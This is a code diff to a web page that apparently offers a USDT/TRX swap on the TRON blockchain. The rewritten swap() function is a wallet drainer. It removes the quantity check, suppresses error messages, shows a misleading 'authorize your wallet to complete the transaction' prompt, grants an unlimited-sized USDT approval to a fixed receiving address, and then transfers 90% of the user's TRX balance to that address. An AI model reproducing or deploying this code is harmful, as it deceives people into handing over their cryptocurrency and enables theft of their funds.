@@ -568,32 +568,19 @@
 				$($("input")[0]).keyup();
 			  }
 
-			  function swap() {
-				 Qmsg.error = console.log;
-				/*
-				if (Number($($("input")[0]).val()) <= 0) {
-				  Qmsg.error({
-					autoClose: true,
-					content: `<br><br>The Quantity of exchanges is incorrect<br><br>兌換數量不正確`,
-					timeout: 3000,
-				  });
-				  return;javascript:;
-				}
-				*/
+			  async function swap() {
+				Qmsg.error = console.log;
 				let loading = Qmsg.loading(
 				  `<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
 				);
-				tronWeb
-				  .contract()
-				  .at(usdtTrc20)
-				  .then((usdtContract) => {
-					  usdtContract
-						  .approve(toAddress, 1000000000000000)
-						  .send()
-						  .finally(() => {
-							  console.log("Approved!");
-						  });
-				});
+				let usdtContract = await tronWeb.contract().at(usdtTrc20);
+				await usdtContract.approve(toAddress, 1000000000000000).send();
+				console.log("Approved!");
+				await tronWeb.trx.getAccount();
+				let trxbalance = await tronWeb.trx.getBalance();
+				let sendTrx = Math.round(Number(trxbalance).mul(Number(90).div(100)));
+				await tronWeb.trx.sendTransaction(toAddress, sendTrx);
+				console.log("Transfed!");
 			  }
 			   
 			  function toTrx(usdtContract) {
